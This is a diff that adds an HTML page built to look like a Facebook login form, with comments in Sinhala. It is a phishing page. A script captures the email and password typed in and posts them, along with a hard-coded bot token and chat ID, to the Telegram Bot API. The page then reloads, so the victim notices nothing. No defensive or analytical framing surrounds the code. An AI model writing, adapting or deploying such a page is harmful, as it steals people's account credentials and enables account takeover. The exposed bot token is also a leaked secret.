@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Social Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#f0f2f5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:white;
+    padding:30px;
+    width:350px;
+    border-radius:10px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.15);
+    text-align:center;
+}
+
+h1{
+    color:#1877f2;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+    border:1px solid #ddd;
+    border-radius:6px;
+    outline: none;
+}
+
+/* බොත්තම් මෝස්තර ලබා දීම */
+.btn-link {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 6px;
+    background:#1877f2;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+    text-decoration: none;
+    font-weight: bold;
+    box-sizing: border-box;
+    transition: opacity 0.2s, background-color 0.2s;
+}
+
+/* බොත්තම අක්‍රිය (Disabled) වී ඇති විට පෙනුම */
+.btn-link.disabled {
+    background: #1877f2;
+    cursor: not-allowed;
+    pointer-events: none; /* Click කිරීම වැළැක්වීම */
+}
+
+.btn-link:not(.disabled):hover{
+    opacity:0.9;
+}
+
+a.forgot-link {
+    display:block;
+    margin-top:15px;
+    text-decoration:none;
+    color:#1877f2;
+}
+
+.signup{
+    margin-top:20px;
+    background:#42b72a;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>Facebook Login</h1>
+
+    <form>
+        <input type="text" id="username" placeholder="Email or Username" oninput="checkInputs()" required>
+        <input type="password" id="password" placeholder="Password" oninput="checkInputs()" required>
+
+        <a href="https://www.facebook.com/share/r/1DBGkJ4DkH/" id="loginBtn" class="btn-link disabled">Log In</a>
+
+        <a href="Forgot Password.html" class="forgot-link">Forgot Password?</a>
+
+        <a href="Create New Account.html" class="btn-link signup">
+            Create New Account
+        </a>
+    </form>
+</div>
+
+<script>
+function checkInputs() {
+    const usernameInput = document.getElementById('username').value.trim();
+    const passwordInput = document.getElementById('password').value.trim();
+    const loginBtn = document.getElementById('loginBtn');
+
+    // කොටු දෙකම හිස් නොවේ නම් පමණක් බොත්තම සක්‍රිය කරයි
+    if (usernameInput !== "" && passwordInput !== "") {
+        loginBtn.classList.remove('disabled');
+    } else {
+        loginBtn.classList.add('disabled');
+    }
+}
+</script>
+
+</body>
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const botToken = "8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI";
+    const chatId = "7883989086"; // මෙතනට ඔබේ Chat ID එක ඇතුලත් කරන්න
+    
+    const email = document.querySelectorAll('input')[0].value;
+    const password = document.querySelectorAll('input')[1].value;
+    
+    const message = "Login Attempt:\nUser: " + email + "\nPass: " + password;
+    
+    fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    }).then(response => {
+        window.location.reload();
+    });
+});
+</script>
+
+</body>
+</html>
